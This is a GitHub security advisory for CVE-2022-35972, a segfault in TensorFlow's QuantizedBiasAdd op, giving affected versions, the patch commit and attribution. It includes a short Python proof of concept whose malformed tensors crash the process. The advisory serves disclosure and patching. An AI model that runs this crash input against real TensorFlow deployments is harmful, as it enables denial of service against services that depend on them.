# [M] TensorFlow vulnerable to segfault in `QuantizedBiasAdd`

## Summary
Severity: Medium
Advisory: GHSA-4pc4-m9mj-v2r9
CVE: CVE-2022-35972
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-4pc4-m9mj-v2r9
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizedBiasAdd` is given `min_input`, `max_input`, `min_bias`, `max_bias` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.qint32
input = tf.constant([85,170,255], shape=[3], dtype=tf.quint8)
bias = tf.constant(43, shape=[2,3], dtype=tf.quint8)
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[1], dtype=tf.float32)
min_bias = tf.constant(0, shape=[1], dtype=tf.float32)
max_bias = tf.constant(0, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedBiasAdd(input=input, bias=bias, min_input=min_input, max_input=max_input, min_bias=min_bias, max_bias=max_bias, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4pc4-m9mj-v2r9
- https://nvd.nist.gov/vuln/detail/CVE-2022-35972
- https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
